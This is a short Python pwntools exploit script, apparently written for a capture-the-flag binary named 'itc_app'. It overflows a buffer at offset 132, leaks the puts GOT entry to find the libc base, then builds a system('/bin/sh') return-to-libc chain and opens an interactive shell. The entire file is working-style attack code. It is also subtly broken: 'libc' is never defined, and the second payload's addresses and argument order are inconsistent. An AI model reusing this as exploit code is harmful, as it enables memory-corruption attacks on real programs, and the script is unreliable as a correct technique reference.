from pwn import *

# Set up the binary and context
binary_path = './itc_app'
elf = context.binary = ELF(binary_path)
context.update(arch='i386', os='linux')

# Start the process
p = process(binary_path)

# Function to leak libc address and calculate libc base
def leak_libc_address():
    # Craft the first payload to leak the address of a libc function (puts)
    payload = flat({
        132: [
            elf.plt['puts'],  # Call puts@plt to print out the address of puts@got
            elf.symbols['main'],  # Return to main after leaking the address
            elf.got['puts']  # Address of puts in the GOT to leak
        ]
    })

    # Send the payload
    p.sendlineafter('>', payload)

    # Receive the leaked address
    leaked_puts = u32(p.recv(4))
    log.info(f'Leaked puts@GOT address: {hex(leaked_puts)}')

    # Calculate the libc base address
    libc_base = leaked_puts - libc.symbols['puts']
    log.info(f'Calculated libc base address: {hex(libc_base)}')
    return libc_base

# Calculate libc base address by leaking an address
libc_base = leak_libc_address()

# Craft the second payload to get a shell
payload = flat({
    132: [
        elf.plt['system'],  # system@plt
        next(elf.search(b'/bin/sh\x00')),  # Return to this address after system
        libc_base + next(libc.search(b'/bin/sh\x00'))  # "/bin/sh" string found in libc
    ]
})

# Send the payload to get a shell
p.sendlineafter('>', payload)

# Switch to interactive mode
p.interactive()
